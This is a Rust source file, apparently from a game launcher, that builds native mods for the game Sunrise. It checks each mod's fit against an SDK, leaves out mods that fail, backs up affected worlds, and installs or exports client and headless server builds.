pub struct AtStake {
    /// The mods and the worlds saved with them, and that opening the worlds without them
    /// removes their content for good.
    pub text: String,
    /// The worlds' names.
    pub worlds: Vec<String>,
    /// Every mod the stop is about.
    pub mods: Vec<String>,
    /// The mods among them that looked compatible and didn't build.
    pub unbuilt: Vec<String>,
    /// Where backups go.
    pub backups: PathBuf,
    /// The build the instance plays now, as people read it: "Stay on" it is the default.
    pub stay: String,
    /// The release or Nightly the stopped build was on: the other choice builds on it again.
    pub base: String,
}

/// What the SDK's tool said of a set of mods: each one's verdict or refusal, by id, and the route the usable ones take.
#[derive(Default)]
struct Checks {
    verdicts: Vec<(String, fit::Verdict)>,
    refusals: Vec<(String, String)>,
    route: String,
}

/// The mods `ids` of `folder` checked against `sdk`'s build by its tool (`native-check`); the surface and build data are fetched only when a mod made for another build needs them.
fn check_all(
    folder: &Path,
    ids: &[&str],
    sdk: &sdk_cache::Sdk,
    base: &sdk_cache::Base,
) -> Result<Checks, sdk_cache::Refusal> {
    if ids.is_empty() {
        return Ok(Checks::default());
    }
    let refused = |why: String| sdk_cache::Refusal::Refused {
        build: sdk.shown(),
        why,
    };
    let program = sdk_cache::tool(sdk, base, &|_| {})?;
    let mut plan = serde_json::json!({"contract": 2, "mods": folder, "build": sdk.commit()});
    let checked = loop {
        let checked = tool::check(&program, &plan).map_err(refused)?;
        let needs = |what: &str| {
            checked
                .mods
                .iter()
                .any(|m| m.needs.as_deref() == Some(what))
        };
        if needs("surface") && plan.get("surface").is_none() {
            plan["surface"] = serde_json::json!(sdk_cache::surface_file(sdk, base)?);
        } else if needs("build-data") && plan.get("build_data").is_none() {
            plan["build_data"] = serde_json::json!(sdk_cache::build_data(sdk, base)?);
        } else {
            break checked;
        }
    };
    checks_from(checked, ids).map_err(refused)
}

/// The checks of `ids` in the tool's reply; a reply naming no route comes from a tool older than this launcher.
fn checks_from(checked: tool::Checked, ids: &[&str]) -> Result<Checks, String> {
    let mut checks = Checks {
        route: checked.route.ok_or_else(tool::too_old)?,
        ..Checks::default()
    };
    for id in ids {
        let Some(found) = checked.mods.iter().find(|m| m.id == *id) else {
            continue;
        };
        if let Some(refusal) = &found.refusal {
            let text = trf(
                "{mod} can't be built here: {why}",
                &[("mod", id), ("why", refusal)],
            );
            checks.refusals.push((id.to_string(), text));
        } else if let Some(verdict) = &found.verdict {
            checks.verdicts.push((id.to_string(), verdict.clone()));
        }
    }
    Ok(checks)
}

/// A build's refusal of the mod tools, as the player reads it. A refused signature is short on
/// screen, so its reason goes to the build log, where a report can quote it.
fn refused(refusal: sdk_cache::Refusal) -> String {
    if let sdk_cache::Refusal::Unsigned { build, why } = &refusal {
        let _ = append_log(&trf(
            "The mod tools for {build} were refused: {why}",
            &[("build", build), ("why", why)],
        ));
    }
    refusal.to_string()
}

/// Never switch a mod off silently in a game folder with worlds (SDK design §10.1, "Worlds"):
/// when a world in `home` was saved with a mod of `left`, the build stops with
/// [`Failed::Worlds`] naming them, unless the player chose `back_up`; then each of those worlds
/// is backed up first, and a backup that fails stops the build with nothing switched off.
fn guard_worlds(
    home: &Path,
    left: &[LeftOut],
    build: &str,
    back_up: bool,
    progress: &impl Fn(Step),
) -> Result<(), Failed> {
    let ids: Vec<String> = left.iter().map(|l| l.id.clone()).collect();
    let all = crate::worlds::list(home);
    let at_stake = crate::worlds::saved_with(&all, &ids);
    if at_stake.is_empty() {
        return Ok(());
    }
    if !back_up {
        let text = left
            .iter()
            .filter_map(|l| {
                let worlds: Vec<String> = at_stake
                    .iter()
                    .filter(|(_, mods)| mods.contains(&l.id))
                    .map(|(world, _)| world.name.clone())
                    .collect();
                (!worlds.is_empty()).then(|| match l.why {
                    isolate::Why::DidNotBuild => {
                        fit::worlds_at_stake_unbuilt(&l.id, build, &worlds)
                    }
                    _ => fit::worlds_at_stake(&l.id, build, &worlds),
                })
            })
            .collect::<Vec<_>>()
            .join("\n\n");
        return Err(Failed::Worlds(Box::new(AtStake {
            text,
            worlds: at_stake
                .iter()
                .map(|(world, _)| world.name.clone())
                .collect(),
            mods: left
                .iter()
                .filter(|l| at_stake.iter().any(|(_, mods)| mods.contains(&l.id)))
                .map(|l| l.id.clone())
                .collect(),
            unbuilt: left
                .iter()
                .filter(|l| matches!(l.why, isolate::Why::DidNotBuild))
                .filter(|l| at_stake.iter().any(|(_, mods)| mods.contains(&l.id)))
                .map(|l| l.id.clone())
                .collect(),
            backups: home.join("backups"),
            stay: String::new(),
            base: String::new(),
        })));
    }
    for (world, _) in &at_stake {
        let made = crate::worlds::backup(home, world).map_err(|error| {
            Failed::Other(trf(
                "Backing up {world} failed, so nothing was switched off or updated: {error}",
                &[("world", &world.name), ("error", &error)],
            ))
        })?;
        let said = trf(
            "Backed up {world} to {path}",
            &[
                ("world", &world.name),
                ("path", &made.display().to_string()),
            ],
        );
        append_log(&said)?;
        progress(Step::BackedUp(said));
    }
    Ok(())
}

/// The pipeline both targets build with ([`build`], [`build_server`]): `folder`'s mods on the
/// Sunrise revision they pin (else `base`'s, the installed version whose game files the build
/// reuses: a native build's own revision when it is one, [`base_for`]), compiled as `target`
/// (the game, or the headless engine) and installed as its own version,
/// `native-<revision>-<key>` (the key hashes the revision, the mods' files, the tool's commit,
/// the profile and the target). A build already made is used again. A mod pinned to another
/// Sunrise revision is refused: the error starts with [`MISMATCH`] and names the mismatched pins.
/// Building never changes a mod's Sunrise pin to match the installed game. Isolation leaves out
/// only a mod blamed by mixin or compiler diagnostics and its required dependents; servers refuse
/// failures without leaving anything out.
/// Nothing of the player's outside the launcher's data is touched: no instance is edited and
/// no version selected here.
fn pipeline(
    lease: &crate::native_cache::Cache,
    base: &str,
    folder: &Path,
    profile: Profile,
    target: Target,
    options: BuildOptions<'_>,
    progress: &impl Fn(Step),
) -> Result<Built, Failed> {
    let started = std::time::Instant::now();
    let built_on = checked_about(base)?;
    backend::need_prepared(base)?;
    let platform = platform_for_game(base)?;
    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
    // The mods are copied first: the build and its key use the copy, whatever happens to the
    // folder meanwhile.
    let incoming = root().join("mods.incoming");
    let _ = fs::remove_dir_all(&incoming);
    let found = scan_bundles(folder)?;
    if found.is_empty() {
        return Err(Failed::Nothing);
    }
    // A native build starts from the release or Nightly it was made from, on its own revision.
    let origin = built_on.as_ref().map_or(base, |a| a.base.as_str());
    let mut ids = std::collections::HashSet::new();
    for b in &found {
        if !ids.insert(&b.manifest.id) {
            return Err(format!("Duplicate native mod id {:?}.", b.manifest.id).into());
        }
        copy_bundle(b, &incoming.join(&b.manifest.id))?;
    }
    let digests: std::collections::HashMap<String, Option<String>> = found
        .iter()
        .map(|b| (b.manifest.id.clone(), source_digest(b)))
        .collect();
    // The cache identifies every requested input, including a mod left out after a failure:
    // replacing its files must retry it rather than reuse a build that excluded the old copy.
    let requested: Vec<Bundle> = found
        .into_iter()
        .map(|b| Bundle {
            dir: incoming.join(&b.manifest.id),
            ..b
        })
        .collect();
    let mods: Vec<Bundle> = requested
        .iter()
        .filter(|b| b.manifest.native.is_some())
        .cloned()
        .collect();
    let side = match target {
        Target::Client => sunrise_launcher_smod::manifest::Side::Client,
        Target::Server => sunrise_launcher_smod::manifest::Side::Server,
    };
    let declared: Vec<Vec<dependencies::Dependency>> = mods
        .iter()
        .map(|bundle| dependencies::from_manifest(&bundle.manifest.dependencies, side))
        .collect();
    let pairs: Vec<(&Bundle, &[dependencies::Dependency])> = mods
        .iter()
        .zip(&declared)
        .map(|(b, d)| (b, d.as_slice()))
        .collect();
    let left_out = isolate::with_dependents(options.skip, &pairs);
    let (mods, declared): (Vec<Bundle>, Vec<Vec<dependencies::Dependency>>) = mods
        .into_iter()
        .zip(declared)
        .filter(|(b, _)| !left_out.iter().any(|l| l.id == b.manifest.id))
        .unzip();
    if mods.is_empty() && requested.iter().all(|b| b.manifest.wasm.is_none()) {
        return Err(Failed::Nothing);
    }
    let inputs: Vec<_> = mods
        .iter()
        .zip(&declared)
        .map(|(bundle, deps)| dependencies::Mod {
            id: &bundle.manifest.id,
            version: &bundle.manifest.version,
            has_api: true,
            code: true,
            dependencies: deps,
        })
        .collect();
    // Native sources live beside the instance's sunrise-mods directory. Read
    // its policy before compiling, but never use dispatch overrides to stage
    // an incomplete or reversed Cargo library graph.
    let instance = folder.parent().unwrap_or_else(|| Path::new("."));
    let overrides =
        dependencies::Overrides::read(&instance.join(sunrise_launcher_smod::mod_list::DIR))?;
    let settings = sunrise_launcher_smod::mod_list::ModList::load(instance);
    let content: Vec<_> =
        sunrise_launcher_smod::selection::content_packages(instance, &settings.enabled, &[])
            .collect();
    let requested_ids: std::collections::HashSet<_> = requested
        .iter()
        .map(|bundle| bundle.manifest.id.as_str())
        .collect();
    let applicable: Vec<_> = requested
        .iter()
        .filter(|bundle| !left_out.iter().any(|left| left.id == bundle.manifest.id))
        .map(|bundle| &bundle.manifest)
        .chain(
            content
                .iter()
                .filter(|source| {
                    let manifest = &source.package.manifest;
                    let code = manifest.native.is_some() || manifest.wasm.is_some();
                    !code || !requested_ids.contains(manifest.id.as_str())
                })
                .map(|source| &source.package.manifest),
        )
        .collect();
    dependencies::resolve_manifests(&applicable, side, &overrides)
        .map_err(|error| error.to_string())?;
    let resolution = dependencies::resolve_links(&inputs)
        .map_err(|error| format!("code link requirements refused: {error}"))?;
    let ordered: Vec<Bundle> = resolution.order.iter().map(|&i| mods[i].clone()).collect();
    let ids: Vec<&str> = mods.iter().map(|b| b.manifest.id.as_str()).collect();
    for bundle in &ordered {
        if !bundle.manifest.internals.is_empty() {
            let paths = bundle
                .manifest
                .internals
                .iter()
                .map(|internal| internal.path.as_str())
                .collect::<Vec<_>>()
                .join(", ");
            append_log(&trf(
                "{mod} uses {count} game internals: {paths}",
                &[
                    ("mod", &bundle.manifest.id),
                    ("count", &bundle.manifest.internals.len().to_string()),
                    ("paths", &paths),
                ],
            ))?;
        }
    }
    let revision = build_revision(base, built_on.as_ref())?;
    let developer = crate::developer_install::is_developer(origin);
    let sdk_base = sdk_cache::Base::from_env();
    let keys = sunrise_launcher_release_verify::sdk_keys_for(backend::REPO);
    // A developer install's checkout has no published surface to test against: its mods are
    // made for it exactly. Any other build tests each mod made for another build (SDK design §10).
    let sdk = if developer {
        if let Some(list) = mismatch(&mods, &revision) {
            return Err(mismatch_error(&list).into());
        }
        None
    } else {
        Some(sdk_cache::index(&sdk_base, &revision, &keys).map_err(refused)?)
    };
    let mut fitted: Vec<String> = Vec::new();
    let mut route = None;
    if let Some(sdk) = &sdk {
        progress(Step::Checking(ids.len()));
        let checks = check_all(&incoming, &ids, sdk, &sdk_base).map_err(|r| r.to_string())?;
        if let Some((_, refusal)) = checks.refusals.first() {
            return Err(refusal.clone().into());
        }
        route = Some(checks.route);
        let mut unusable = Vec::new();
        for (id, verdict) in checks.verdicts {
            match verdict {
                fit::Verdict::MadeFor => {}
                fit::Verdict::Fits { .. } => fitted.push(id),
                unfit => unusable.push((id, unfit)),
            }
        }
        if !unusable.is_empty() {
            let shown = sdk.shown();
            let texts: Vec<String> = unusable
                .iter()
                .map(|(id, verdict)| fit::refusal(id, verdict, &shown))
                .collect();
            for (id, verdict) in &unusable {
                // The log has every changed item; messages name at most a few.
                if let fit::Verdict::DoesNotFit { misfits, .. } = verdict {
                    for misfit in misfits {
                        append_log(&format!("{id}: {}", fit::change(misfit)))?;
                    }
                }
            }
            for text in &texts {
                append_log(text)?;
            }
            // A server has no Mods page: the refusal and what to do are printed, and nothing is
            // switched off for it.
            if target == Target::Server {
                return Err(texts.join("\n\n").into());
            }
            let pairs: Vec<(&Bundle, &[dependencies::Dependency])> = mods
                .iter()
                .zip(&declared)
                .map(|(b, d)| (b, d.as_slice()))
                .collect();
            let unfit: Vec<LeftOut> = unusable
                .iter()
                .filter_map(|(id, verdict)| {
                    let bundle = mods.iter().find(|b| &b.manifest.id == id)?;
                    let why = isolate::Why::Unfit(fit::line(id, verdict, &shown));
                    Some(LeftOut::new(bundle, why))
                })
                .collect();
            let left = isolate::with_dependents(&unfit, &pairs);
            if let Some(home) = options.worlds {
                guard_worlds(home, &left, &shown, options.back_up, progress)?;
            }
            return Err(Failed::Mods {
                left,
                error: texts.join("\n\n"),
                compiling: false,
            });
        }
    }
    if target == Target::Server {
        let jars = sunrise_launcher_smod::manifest::collect_jar_requirements(
            mods.iter()
                .map(|bundle| (bundle.manifest.id.as_str(), bundle.manifest.jar.as_slice())),
        )
        .map_err(|error| crate::jars::LaunchError::Conflict(error).to_string())?;
        crate::jars::prepare(
            &backend::game_home(),
            &jars,
            crate::jars::Permission::headless(options.allow_jar_downloads),
        )
        .map_err(|error| error.to_string())?;
    }
    // A mod made for another build that fits this one and still doesn't compile is switched off
    // here, and the others build: the compile is the final check.
    // Switching it off follows the world rules like any other switch-off: when worlds were saved
    // with it (or with a mod that needs it), the build stops unless the player chose to back
    // them up.
    let (worlds, back_up) = (options.worlds, options.back_up);
    let shown = sdk
        .as_ref()
        .map_or_else(|| sdk_cache::shown(&revision, None), |sdk| sdk.shown());
    let blame = |e: String| -> Failed {
        let failed = fitted.iter().find_map(|id| {
            let bundle = mods.iter().find(|b| &b.manifest.id == id)?;
            e.contains(&build_log::failed(&compiling_mod(id)))
                .then(|| LeftOut::new(bundle, isolate::Why::DidNotBuild))
        });
        let Some(left) = failed else {
            return Failed::Other(e);
        };
        if let Some(home) = worlds {
            let pairs: Vec<(&Bundle, &[dependencies::Dependency])> = mods
                .iter()
                .zip(&declared)
                .map(|(b, d)| (b, d.as_slice()))
                .collect();
            let going = isolate::with_dependents(std::slice::from_ref(&left), &pairs);
            if let Err(stop) = guard_worlds(home, &going, &shown, back_up, progress) {
                return stop;
            }
        }
        Failed::Mods {
            error: format!("{}\n\n{e}", fit::did_not_build(&left.id)),
            left: vec![left],
            compiling: true,
        }
    };
    let mixins = newest(
        &mods,
        "horizon-mixins",
        |b| Some(&b.native().mixins),
        || Ok(MIXINS_REV.into()),
        Some(MIXINS_REV),
        |r| committed("horizon-rust/horizon-mixins", r),
    )?;
    // Keep developer provenance distinct from a signed base at the same source commit.
    let developer_key = crate::developer_install::is_developer(origin)
        .then(|| format!("{}:{origin}", platform.cache_key().unwrap_or_default()));
    let version = version_for(
        &revision,
        &mixins,
        profile,
        target,
        developer_key.as_deref().or(platform.cache_key()),
        &requested,
    )?;
    let exists = target.directory(&version).join(".installed").is_file();
    // The steps around the mods' compile, timed like each command (`run_checked`), so the log
    // accounts for the whole build.
    let timed = |step: &str, since: std::time::Instant| {
        append_log(&trf(
            "{step}: {ms} ms",
            &[
                ("step", step),
                ("ms", &since.elapsed().as_millis().to_string()),
            ],
        ))
    };
    timed("Planning the build", started)?;
    let fetching = std::time::Instant::now();
    let prebuilt = if exists {
        None
    } else {
        let local = developer_key
            .is_some()
            .then(|| std::env::var_os(sdk_cache::DEVELOPER_SDK))
            .flatten()
            .map(PathBuf::from);
        let package = match (local, &sdk) {
            (Some(local), _) => {
                let program = sdk_cache::developer_tool(true).ok_or_else(|| {
                        trf(
                            "A developer base's own SDK needs its own native build tool: build cargo-sunrise-mod from the same checkout and set {variable} to it.",
                            &[("variable", sdk_cache::DEVELOPER_TOOL)],
                        )
                    })?;
                (
                    sdk_cache::developer(&program, &revision, target, &local)?,
                    program,
                )
            }
            (None, sdk) => {
                // A developer install without its own prebuilt game uses its commit's SDK
                // release, when one is published.
                let fetched;
                let sdk = match sdk {
                    Some(sdk) => sdk,
                    None => {
                        fetched = sdk_cache::index(&sdk_base, &revision, &keys).map_err(refused)?;
                        &fetched
                    }
                };
                let shown = sdk.shown();
                // Nothing to fetch (every slice kept from an earlier build) is said as such,
                // never as a download of nothing.
                let fetched = |got: sdk_cache::Fetched| {
                    progress(match got.total {
                        0 => Step::ToolsKept {
                            build: shown.clone(),
                        },
                        total => Step::Tools {
                            build: shown.clone(),
                            done: got.done,
                            total,
                        },
                    })
                };
                let program = sdk_cache::tool(sdk, &sdk_base, &fetched).map_err(refused)?;
                // A developer base using its commit's SDK release asks its route here: no fit was checked.
                let route = match route.clone() {
                    Some(route) => route,
                    None => {
                        check_all(&incoming, &ids, sdk, &sdk_base)
                            .map_err(refused)?
                            .route
                    }
                };
                let slices = sdk_cache::slices(lease, sdk, &sdk_base, &route, target, &fetched)
                    .map_err(refused)?;
                (slices, program)
            }
        };
        Some(package)
    };
    if prebuilt.is_some() {
        timed("Checking the prebuilt game", fetching)?;
    }
    check_cancelled()?;
    let plan = if exists {
        Plan::UpToDate
    } else {
        Plan::Prebuilt
    };
    progress(Step::Plan(plan.clone(), profile));
    let mut built = Built {
        version: version.clone(),
        plan: plan.clone(),
        profile,
        secs: 0,
        left_out: if exists {
            about(&version)
                .map(|about| about.left_out)
                .unwrap_or_default()
        } else {
            left_out.clone()
        },
    };
    // The record carries each declaration's hash as the build checked it: an absent one from
    // the pinned catalog (`internals::Catalog::pinned`).
    let about = |route: &str,
                 internals: &std::collections::BTreeMap<String, serde_json::Value>,
                 libraries: &serde_json::Value| {
        serde_json::json!({
            "libraries": libraries,
            "base": origin,
            "sunrise": revision,
            "horizon_mixins": mixins,
            "rust": rust_toolchain::VERSION,
            "profile": profile.name(),
            "route": route,
            "left_out": left_out.iter().map(|left| {
                let mut json = left.to_json();
                json["sha256"] = serde_json::json!(digests.get(&left.id).cloned().flatten());
                json
            }).collect::<Vec<_>>(),
            "target": target.name(),
            "rust_target": platform.target,
            "secs": started.elapsed().as_secs(),
            "mods": requested.iter().filter(|m| !left_out.iter().any(|l| l.id == m.manifest.id)).map(|m| {
                serde_json::json!({
                    "id": m.manifest.id,
                    "version": m.manifest.version,
                    "sha256": digests.get(&m.manifest.id).cloned().flatten(),
                    "internals": internals.get(&m.manifest.id).cloned().unwrap_or_else(|| serde_json::json!([])),
                })
            }).collect::<Vec<_>>(),
        })
    };
    let linker = || match target {
        // The headless build links none of the sound or controller libraries: it needs
        // only a C compiler and the C library's headers ([`rust_toolchain::linker_server`]).
        Target::Client => rust_toolchain::linker(),
        Target::Server => rust_toolchain::linker_server(),
    };
    if let Some((game, program)) = &prebuilt {
        let checking = std::time::Instant::now();
        linker()?;
        let rust = rust_toolchain::install(|f| progress(Step::Rust(f)))?;
        timed("Checking the Rust toolchain", checking)?;
        progress(Step::PrebuiltMods);
        let compiling = std::time::Instant::now();
        // The tool compiles every mod in the folder it's given: exactly the staged copies of the ones this build keeps.
        let compiled = root().join("mods.compile");
        let _ = fs::remove_dir_all(&compiled);
        for bundle in &mods {
            copy_bundle(bundle, &compiled.join(&bundle.manifest.id))?;
        }
        let built = tool::build(
            &rust,
            program,
            &tool::Plan {
                work: &root(),
                package: tool::Package {
                    runtime: &game.runtime,
                    api: &game.api,
                    engine: &game.engine,
                },
                mods: &compiled,
                server: target == Target::Server,
                mixins_from_source: MIXINS_FROM_SOURCE.load(std::sync::atomic::Ordering::Relaxed),
            },
            options.registry_consent,
            &|id, done, total| {
                progress(Step::Mod {
                    id: id.to_owned(),
                    done,
                    total,
                })
            },
        )
        .map_err(|failure| blame(blamed_text(failure)))?;
        let _ = fs::remove_dir_all(&compiled);
        append_log(&trf(
            "Native mods route: {route}.",
            &[("route", &built.route)],
        ))
        .map_err(blame)?;
        // The whole step; the tool's own build and the function replacement have their lines.
        append_log(&trf(
            "Mods compiled against the prebuilt game in {seconds} s",
            &[(
                "seconds",
                &format!("{:.1}", compiling.elapsed().as_secs_f64()),
            )],
        ))
        .map_err(blame)?;
        check_cancelled()?;
        progress(Step::Install);
        let installing = std::time::Instant::now();
        install(
            base,
            &version,
            target,
            &built.binary,
            &built.libraries,
            &about(&built.route, &built.internals, &built.records),
            &ordered,
        )?;
        timed("Installing the build", installing)?;
    } else {
        // Used again: it counts as the newest of the builds kept (`prune`).
        let _ = fs::write(target.directory(&version).join(".installed"), "");
    }
    let _ = fs::remove_dir_all(&incoming);
    built.secs = started.elapsed().as_secs();
    Ok(built)
}

/// How many times a build compiles again without the mods the compiler's errors were traced to:
/// each costs a compile, where a mod that doesn't apply costs only horizon-mixins' run.
const COMPILE_RETRIES: usize = 3;

/// Runs `pipeline` until it builds, each time without the mods that stopped it before (they
/// are said with `progress` as they are left out, and those needing them once it built). The
/// error, when it can't, starts with the mods already left out.
fn isolated(
    mut pipeline: impl FnMut(&[LeftOut]) -> Result<Built, Failed>,
    progress: &impl Fn(Step),
) -> Result<Built, Failed> {
    let mut skip: Vec<LeftOut> = Vec::new();
    let mut compiles = 0;
    let mut last = String::new();
    let said = |skip: &[LeftOut], error: String| {
        let labels: Vec<String> = skip.iter().map(LeftOut::label).collect();
        Failed::Other(match labels.is_empty() {
            true => error,
            false => format!("{}\n\n{error}", labels.join("\n")),
        })
    };
    loop {
        match pipeline(&skip) {
            Ok(built) => {
                for left in built.left_out.iter().filter(|l| !skip.contains(l)) {
                    log_warning(&left.label());
                    progress(Step::LeftOut(left.clone()));
                }
                return Ok(built);
            }
            Err(Failed::Mods {
                left,
                error,
                compiling,
            }) => {
                compiles += usize::from(compiling);
                let new: Vec<LeftOut> = left
                    .into_iter()
                    .filter(|l| !skip.iter().any(|s| s.id == l.id))
                    .collect();
                if new.is_empty() || compiles > COMPILE_RETRIES {
                    return Err(said(&skip, error));
                }
                for left in new {
                    log_warning(&left.label());
                    progress(Step::LeftOut(left.clone()));
                    skip.push(left);
                }
                last = error;
            }
            Err(Failed::Nothing) => return Err(said(&skip, last)),
            Err(Failed::NoConsent) => return Err(Failed::NoConsent),
            Err(Failed::Worlds(stake)) => return Err(Failed::Worlds(stake)),
            Err(Failed::Other(error)) if error == CANCELLED => return Err(Failed::Other(error)),
            Err(Failed::Other(error)) => return Err(said(&skip, error)),
        }
    }
}

fn select_build_profile(
    _saved: Profile,
    requested: Option<Profile>,
    plan: impl FnOnce() -> Result<Routes, Failed>,
) -> Result<Profile, String> {
    check_cancelled()?;
    match requested {
        Some(profile) => Ok(profile),
        None => {
            let routes = plan();
            check_cancelled()?;
            routes.map_err(String::from)?;
            Ok(Profile::Optimized)
        }
    }
}

/// Builds `folder`'s mods on the Sunrise revision they pin (else `base`'s, the installed version
/// whose game files the build reuses: a native build's own revision when it is one, [`base_for`])
/// and points `instance` at the build, the default one included. Returns the build's version; a
/// build already made is used again. Mods pinning different revisions cannot build together:
/// the error starts with [`MISMATCH`] and names them; `cargo sunrise-mod update --sunrise
/// <commit>` in each mod's folder pins it to the installed game, then build again.
/// `profile` is an explicit override; None applies the instance's choice only when needed.
pub fn build(
    base: &str,
    folder: &Path,
    instance: &Instance,
    profile: Option<Profile>,
    back_up: bool,
    progress: impl Fn(Step),
    registry_consent: impl Fn(&Consent) -> bool,
) -> Result<String, Failed> {
    require_consent()?;
    build_log::clear_cancel();
    if let Some(error) = backend::native_mod_architecture_error() {
        return Err(Failed::Other(error));
    }
    logged(|cache| {
        let lease = cache.map_err(|error| Failed::Other(error.into()))?;
        let profile = select_build_profile(instance.native_profile, profile, || {
            planning::classify(folder, Some(base), lease)
        })?;
        let built = isolated(
            |skip| {
                pipeline(
                    lease,
                    base,
                    folder,
                    profile,
                    Target::Client,
                    BuildOptions {
                        skip,
                        registry_consent: Some(&registry_consent),
                        worlds: Some(&instance.home),
                        back_up,
                        ..BuildOptions::default()
                    },
                    &progress,
                )
            },
            &progress,
        )
        .map_err(|failed| match failed {
            // "Stay" keeps the build the instance plays now.
            Failed::Worlds(stake) => Failed::Worlds(Box::new(AtStake {
                stay: playing(instance),
                base: base.to_owned(),
                ..*stake
            })),
            other => other,
        })?;
        check_cancelled()?;
        // A version or channel the player saved while this built wins: the build stays
        // available, the instance keeps their choice.
        instances::edit(&instance.id, |meta| {
            let unchanged = meta.version == instance.version
                && meta.channel.unwrap_or_default() == instance.channel;
            if unchanged {
                meta.version = Some(built.version.clone());
            }
        })?;
        // logged() runs central eviction under the retained build lease.
        if built.plan != Plan::UpToDate {
            progress(Step::Done {
                secs: built.secs,
                profile: built.profile,
                plan: built.plan,
            });
        }
        Ok(built.version)
    })
}

/// The release or Nightly `instance` plays now (the one a native build of it started from).
fn playing(instance: &Instance) -> String {
    let Ok(version) = instance.resolve_version(None) else {
        return String::new();
    };
    about(&version).map_or(version, |about| about.base)
}

/// Builds `folder`'s mods as the headless engine a dedicated server runs (`sunrise-engine`,
/// docs/server.md): the same pipeline as [`build`] on the same revision, compiled with
/// `--no-default-features`, installed as its own version (its key distinct from the game's, so
/// the two never stand in for each other) and exported into `output` as a standalone runtime
/// folder: the built engine, the base version's resources and the build's record. The folder
/// lives outside the launcher's managed versions, where nothing of the launcher's can remove
/// it; nothing of it is overwritten, and a folder already at `output`
/// is refused before anything is downloaded or compiled. No instance is edited and no version
/// selected: a server build changes nothing the launcher's window plays. Returns the absolute
/// path of the exported engine binary.
pub fn build_server(
    base: &str,
    folder: &Path,
    output: &Path,
    profile: Option<Profile>,
    allow_jar_downloads: bool,
    progress: impl Fn(Step),
    registry_consent: impl Fn(&Consent) -> bool,
) -> Result<PathBuf, Failed> {
    require_consent()?;
    build_log::clear_cancel();
    logged(|cache| {
        if output.symlink_metadata().is_ok() {
            return Err(trf(
                "{path} already exists. Move it away, or build into another folder.",
                &[("path", &output.display().to_string())],
            ));
        }
        let parent = output
            .parent()
            .filter(|p| !p.as_os_str().is_empty())
            .unwrap_or(Path::new("."));
        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
        let output = parent.canonicalize().map_err(|e| e.to_string())?.join(
            output
                .file_name()
                .ok_or_else(|| tr("Choose a new folder for the server export."))?,
        );
        for managed in [backend::version_dir(""), root()] {
            if managed
                .canonicalize()
                .is_ok_and(|dir| output.starts_with(dir))
            {
                return Err(tr("Export the server outside the launcher's managed folders.").into());
            }
        }
        let lease = cache.map_err(str::to_owned)?;
        let profile = select_build_profile(Profile::default(), profile, || {
            planning::classify(folder, Some(base), lease)
        })?;
        let built = pipeline(
            lease,
            base,
            folder,
            profile,
            Target::Server,
            BuildOptions {
                allow_jar_downloads,
                registry_consent: Some(&registry_consent),
                ..BuildOptions::default()
            },
            &progress,
        )
        .map_err(String::from)?;
        export(&Target::Server.directory(&built.version), &output)?;
        // logged() runs central eviction under the retained build lease.
        if built.plan != Plan::UpToDate {
            progress(Step::Done {
                secs: built.secs,
                profile: built.profile,
                plan: built.plan,
            });
        }
        let engine = output.join(Target::Server.binary());
        Ok(std::path::absolute(&engine).unwrap_or(engine))
    })
    .map_err(Failed::Other)
}

/// Copies the built version folder `from` into `output` (outside the managed versions) as one
/// piece: staged in a hidden folder beside `output`, then renamed into place, so an interrupted
/// export leaves nothing half-written at `output` and overwrites nothing already there.
/// Executable files keep their permissions ([`backend::copy_dir`], a clone where the disk can).
fn export(from: &Path, output: &Path) -> Result<(), String> {
    let name = output.file_name().ok_or_else(|| {
        trf(
            "{path} is not a folder to build into.",
            &[("path", &output.display().to_string())],
        )
    })?;
    let parent = output.parent().unwrap_or(output);
    fs::create_dir_all(parent).map_err(|e| format!("{}: {e}", parent.display()))?;
    let staging = parent.join(format!(
        ".{}.{}.exporting",
        name.to_string_lossy(),
        std::process::id()
    ));
    fs::create_dir(&staging).map_err(|e| format!("{}: {e}", staging.display()))?;
    if let Err(e) = copy_runtime(from, &staging) {
        let _ = fs::remove_dir_all(&staging);
        return Err(trf(
            "Could not copy the build: {error}",
            &[("error", &e.to_string())],
        ));
    }
    if output.symlink_metadata().is_ok() {
        let _ = fs::remove_dir_all(&staging);
        return Err(trf(
            "{path} already exists. Move it away, or build into another folder.",
            &[("path", &output.display().to_string())],
        ));
    }
    fs::rename(&staging, output).map_err(|e| {
        let _ = fs::remove_dir_all(&staging);
        trf(
            "Could not move the build to {path}: {error}",
            &[
                ("path", &output.display().to_string()),
                ("error", &e.to_string()),
            ],
        )
    })
}

/// Reflinks are independent files but may not preserve executable permissions.
fn copy_runtime(from: &Path, to: &Path) -> std::io::Result<()> {
    fs::create_dir_all(to)?;
    for entry in fs::read_dir(from)? {
        let entry = entry?;
        let destination = to.join(entry.file_name());
        if entry.file_type()?.is_dir() {
            copy_runtime(&entry.path(), &destination)?;
        } else {
            sunrise_prepare::clone_or_copy(&entry.path(), &destination)?;
            fs::set_permissions(&destination, entry.metadata()?.permissions())?;
        }
    }
    Ok(())
}

mod installation;
use installation::install;

/// Copies version folder `from` into `to` but for what a new build of `target` makes its own
/// ([`carried_over`]), cloned where the disk can. Also an imported build's start (`build_import`).
pub(crate) fn copy_base(
    from: &Path,
    to: &Path,
    target: Target,
    share_resources: bool,
) -> Result<(), String> {
    for entry in fs::read_dir(from).map_err(|e| e.to_string())?.flatten() {
        let name = entry.file_name();
        if !carried_over(&name, target) || (share_resources && name == ".local") {
            continue;
        }
        let to = to.join(&name);
        let copied = if entry.path().is_dir() {
            backend::copy_dir(&entry.path(), &to)
        } else {
            // A clone is a new file: sunrise-ctl and sunrise-server keep their permissions.
            sunrise_prepare::clone_or_copy(&entry.path(), &to)
                .and_then(|()| fs::set_permissions(&to, entry.metadata()?.permissions()))
        };
        copied.map_err(|e| format!("Could not copy {}: {e}", entry.path().display()))?;
    }
    Ok(())
}

/// Whether a file of the version a build starts from goes into the new build. The game (the
/// target's own binary), its record, and unsupported `native-data/` artifacts are not carried
/// over. A server build is the headless engine: it keeps neither the game's own binary
/// nor any `sunrise-engine` the base shipped, which would run unmodded beside its own.
fn carried_over(name: &std::ffi::OsStr, target: Target) -> bool {
    let mut own: Vec<String> = [
        "Sunrise.app",
        "native-mods.json",
        "native-data",
        sunrise_launcher_smod::mod_list::NATIVE_DIR,
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    own.push(backend::CLIENT.to_string());
    own.push(".installed".to_string());
    if target == Target::Server {
        own.push("sunrise-engine".to_string());
    }
    let named = |n: &str| name == std::ffi::OsStr::new(n);
